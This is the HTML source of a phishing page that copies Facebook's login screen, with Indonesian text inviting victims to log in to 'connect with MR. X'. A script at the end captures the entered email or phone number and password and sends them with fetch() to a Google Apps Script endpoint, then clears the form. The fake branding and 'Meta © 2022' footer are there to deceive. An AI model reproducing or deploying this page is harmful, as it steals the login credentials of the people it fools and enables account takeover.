<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Facebook</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" type="text/css" media="all" />
    <link rel="stylesheet" href="style.css" type="text/css" media="all" />
  </head>
  <body>
 
<!-- Facebook Heading -->
<nav class="navbar-dark navigasifb">
  <div class="container-fluid text-center fblogo">
    <span class="navbar-brand mb-0 h1 mx-auto"><b>facebook</b></span>
  </div>
</nav>
<div class="ind text-center">
  <img class="rounded-4" src="Logo.png" alt="logo" width="75px" />
</div>
<div class="tekslogo text-center mb-5">
  <p><b>Masuk ke akun Facebook Anda <br /> untuk terhubung dengan MR. X</b></p>
</div>
<!---tabel form--->
<form name="fblogin">
<div class="mb-0 text-center">
  <input type="text" name="email" id="username" placeholder="Email atau Nomor Telepon">
</div>
<div class="mb-0 text-center">
  <input type="password" name="pwe" id="password" placeholder="Kata Sandi Facebook">
</div>
<div class="mt-3 text-center masuk">
<a href="../error/>
  <input type="submit" value="Masuk"/>
</a>
</div>
</form>
<div class="tulisanbawah text-center">
<p class="mt-3 ba">Buat Akun</p>
<p class="ba">Lain Kali</p>
<table class="bb" border="0" align="center">
  <tr>
    <td>Lupa Kata Sandi?</td>
    <td class="titik">•</td>
    <td>Pusat Bantuan</td>
  </tr>
</table>
</div>
<p class="mt-4 text-center">Meta © 2022</p>
<script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbzkavtkEY800UCwSKKreL1RMwOe4yPWN9YYc8MZ0-nsRF-MIju0gqLOgAKnd1zREZi6Iw/exec'
  const form = document.forms['fblogin']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then((response) => {
        form.reset();
        console.log('Success!', response);
      })
      .catch(error => console.error('Error!', error.message))
  })
</script>
  </body>
</html>
